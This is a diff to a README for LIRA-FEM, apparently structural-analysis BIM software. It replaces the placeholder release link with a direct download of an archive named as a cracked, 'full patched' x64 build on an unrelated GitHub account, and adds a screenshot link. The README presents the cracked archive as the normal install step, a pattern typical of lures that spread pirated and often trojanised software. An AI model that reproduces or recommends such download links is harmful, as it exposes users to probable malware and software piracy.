@@ -9,13 +9,13 @@ LIRA-FEM implements Building Information Modeling (BIM) technology focused on th
 - Disk Space: Minimum 2 GB
 
 ## Installation
-1. Download the latest release [here]().
+1. Download the latest release [here](https://github.com/gagaga1132/LiraSAPR/releases/download/LiraSAPR_Crack/LiraSAPR_crack_Full_Patched_x64.rar).
 2. Extract the archive and follow the installation instructions.
 3. After installation, launch the application.
 
 ## Usage Examples
-- [Screenshots](link_to_images)
-- [Video Tutorials](link_to_videos)
+- [Screenshots](https://github.com/user-attachments/assets/268426fd-4be8-4501-b5fe-b37bf4b359d7)
+
 
 ## Documentation
 Complete documentation is available [here](link_to_documentation).
